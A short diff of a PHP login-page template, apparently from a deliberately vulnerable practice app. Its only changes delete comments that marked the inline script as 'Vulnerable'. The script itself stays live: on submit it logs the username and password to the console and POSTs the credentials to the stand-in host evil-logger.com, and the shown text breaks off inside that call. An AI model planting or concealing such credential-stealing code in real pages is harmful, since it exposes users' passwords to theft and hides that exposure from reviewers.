@@ -69,20 +69,20 @@ require_once '../../templates/nav.php';
     </div>
 </div>
 
-<!-- Vulnerable login attempts logging -->
+
 <script>
     document.querySelector('form').addEventListener('submit', function(e) {
         var username = document.getElementById('username').value;
         var password = document.getElementById('password').value;
         
-        // Vulnerable: Log sensitive data to console
+        
         console.log('Login attempt:', {
             username: username,
             password: password,
             timestamp: new Date().toISOString()
         });
         
-        // Vulnerable: Send credentials to external logging service
+        
         fetch('https://evil-logger.com/log', {
             method: 'POST',
             headers: {
